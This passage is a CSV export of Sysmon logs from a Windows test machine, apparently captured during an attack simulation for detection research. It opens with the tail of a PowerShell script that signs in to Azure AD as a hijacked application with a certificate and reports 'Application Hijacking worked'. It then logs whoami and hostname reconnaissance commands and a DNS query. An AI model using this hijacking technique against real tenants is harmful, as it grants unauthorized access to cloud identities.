$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host \""""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\""""
Write-Host \""""End of Hijacking\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,1,19571,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:11.353

ProcessGuid: {f57bd86a-8bab-658c-c301-000000000f00}

ProcessId: 10912

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft速 Windows速 Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,whoami.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8bab-658c-c301-000000000f00},3588,10912,Microsoft速 Windows速 Operating System,,,,"
      ",-,2023-12-27T20:40:11.3569892Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:40:11.353,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:11.3569892Z""/>
      <EventRecordID>19571</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:40:11.353</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8bab-658c-c301-000000000f00}</Data>
      <Data Name=""ProcessId"">10912</Data>
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:11.353

ProcessGuid: {f57bd86a-8bab-658c-c301-000000000f00}

ProcessId: 10912

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\HOSTNAME.EXE""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,Hostname APP,1,19570,10.0.22621.2506 (WinBuild.160101.0800),"MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8",C:\Windows\System32\HOSTNAME.EXE,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:11.326

ProcessGuid: {f57bd86a-8bab-658c-c201-000000000f00}

ProcessId: 1940

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft速 Windows速 Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,hostname.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8bab-658c-c201-000000000f00},3588,1940,Microsoft速 Windows速 Operating System,,,,"
      ",-,2023-12-27T20:40:11.3272368Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:40:11.326,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:11.3272368Z""/>
      <EventRecordID>19570</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:40:11.326</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8bab-658c-c201-000000000f00}</Data>
      <Data Name=""ProcessId"">1940</Data>
      <Data Name=""Image"">C:\Windows\System32\HOSTNAME.EXE</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Hostname APP</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">hostname.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\HOSTNAME.EXE""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:40:11.326

ProcessGuid: {f57bd86a-8bab-658c-c201-000000000f00}

ProcessId: 1940

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19569,,,C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:51:55.275

ProcessGuid: {f57bd86a-382d-658c-4e01-000000000f00}

ProcessId: 4456

QueryName: img-s-msn-com.akamaized.net

QueryStatus: 0

QueryResults: type: 5 a1834.dscg2.akamai.net;::ffff:104.77.160.140;::ffff:104.77.160.143;

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-382d-658c-4e01-000000000f00},3588,4456,,img-s-msn-com.akamaized.net,type: 5 a1834.dscg2.akamai.net;::ffff:104.77.160.140;::ffff:104.77.160.143;,0,"
      ",-,2023-12-27T20:40:08.3823008Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:51:55.275,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:40:08.3823008Z""/>
      <EventRecordID>19569</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:51:55.275</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-382d-658c-4e01-000000000f00}</Data>
      <Data Name=""ProcessId"">4456</Data>
      <Data Name=""QueryName"">img-s-msn-com.akamaized.net</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">type: 5 a1834.dscg2.akamai.net;::ffff:104.77.160.140;::ffff:104.77.160.143;</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:51:55.275

ProcessGuid: {f57bd86a-382d-658c-4e01-000000000f00}

ProcessId: 4456

QueryName: img-s-msn-com.akamaized.net

QueryStatus: 0

QueryResults: type: 5 a1834.dscg2.akamai.net;::ffff:104.77.160.140;::ffff:104.77.160.143;

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>

"
